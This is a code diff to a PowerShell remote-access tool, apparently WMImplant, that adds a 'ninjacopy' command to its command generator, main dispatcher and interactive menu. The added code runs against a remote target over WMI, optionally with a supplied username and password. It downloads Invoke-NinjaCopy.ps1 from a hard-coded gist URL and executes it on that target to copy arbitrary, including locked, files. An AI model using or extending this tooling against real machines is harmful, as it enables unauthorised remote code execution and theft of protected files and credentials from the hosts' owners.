@@ -569,6 +569,28 @@ function Invoke-CommandGeneration
             }
         }
 
+        "ninjacopy"
+        {
+            $FileToCopy = Read-Host "What is the full path to the file you'd like to copy? >"
+            $CopyLocation = Read-Host "What is the full path to where you'd like the file copied to? >"
+            $FullCommand = '"Invoke-NinjaCopy -Path '
+            $FullCommand += "$FileToCopy "
+            $FullCommand += '-RemoteDestination '
+            $FullCommand += "$CopyLocation"
+            $FullCommand +='"'
+            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
+            {
+                $Command = "`nInvoke-WMImplant -command ninjacopy -RemoteFile $FileToCopy -LocalFile $CopyLocation -RemoteUser $GenUserName -RemotePass $GenPassword -Target $GenTarget`n"
+                $Command
+            }
+
+            else
+            {
+                $Command = "`nInvoke-WMImplant -command ninjacopy -RemoteFile $FileToCopy -LocalFile $CopyLocation -Target $GenTarget`n"
+                $Command
+            }
+        }
+
         "search"
         {
             $SearchBy = Read-Host "Do you want to search for a file [extension] or [name]? >"
@@ -2061,6 +2083,41 @@ function Invoke-WMImplant
                     }
                 }
 
+                "ninjacopy"
+                {
+                    if(!$Target)
+                    {
+                        Throw "You need to specify a target to run the command against!"
+                    }
+
+                    if(!$RemoteFile)
+                    {
+                        Throw "Please provide the RemoteFile parameter to specify the file to copy!"
+                    }
+
+                    if(!$LocalFile)
+                    {
+                        Throw "Please use the LocalFIle parameter to specify where to copy the file to!"
+                    }
+
+                    $FullCommand = '"Invoke-NinjaCopy -Path '
+                    $FullCommand += "$RemoteFile "
+                    $FullCommand += '-RemoteDestination '
+                    $FullCommand += "$LocalFile"
+                    $FullCommand +='"'
+
+                    if ($RemoteCredential)
+                    {
+                        Invoke-RemoteScriptWithOutput -Creds $RemoteCredential -Url https://gist.githubusercontent.com/ChrisTruncer/e7d629bddc354b5405d7dafbc4f64eff/raw/eb868bc462a560970fa167b324250ce9f257904e/Invoke-NinjaCopy.ps1 -Function $FullCommand -Target $Target
+                    }
+
+                    else
+                    {
+                        Invoke-RemoteScriptWithOutput -Url https://gist.githubusercontent.com/ChrisTruncer/e7d629bddc354b5405d7dafbc4f64eff/raw/eb868bc462a560970fa167b324250ce9f257904e/Invoke-NinjaCopy.ps1 -Function $FullCommand -Target $Target
+                    }
+
+                }
+
                 "search"
                 {
                     if(!$Target)
@@ -2724,6 +2781,7 @@ function Show-WMImplantMainMenu
     $menu_options += "cat - Attempt to read a file's contents`n"
     $menu_options += "download - Download a file from a remote machine`n"
     $menu_options += "ls - File/Directory listing of a specific directory`n"
+    $menu_options += "ninjacopy - Copy any file`n"
     $menu_options += "search - Search for a file on a user-specified drive`n"
     $menu_options += "upload - Upload a file to a remote machine`n`n"
 
@@ -2835,6 +2893,26 @@ function Use-MenuSelection
                 else
                 {
                     Invoke-LSWMImplant
+                }
+            }
+
+            "ninjacopy"
+            {
+                $FileToCopy = Read-Host "What is the full path to the file you'd like to copy? >"
+                $CopyLocation = Read-Host "What is the full path to where you'd like the file copied to? >"
+                $FullCommand = '"Invoke-NinjaCopy -Path '
+                $FullCommand += "$FileToCopy "
+                $FullCommand += '-RemoteDestination '
+                $FullCommand += "$CopyLocation"
+                $FullCommand +='"'
+                if ($Credential)
+                {
+                    Invoke-RemoteScriptWithOutput -Creds $Credential -Url https://gist.githubusercontent.com/ChrisTruncer/e7d629bddc354b5405d7dafbc4f64eff/raw/eb868bc462a560970fa167b324250ce9f257904e/Invoke-NinjaCopy.ps1 -Function $FullCommand
+                }
+
+                else
+                {
+                    Invoke-RemoteScriptWithOutput -Url https://gist.githubusercontent.com/ChrisTruncer/e7d629bddc354b5405d7dafbc4f64eff/raw/eb868bc462a560970fa167b324250ce9f257904e/Invoke-NinjaCopy.ps1 -Function $FullCommand
                 }
             }
 
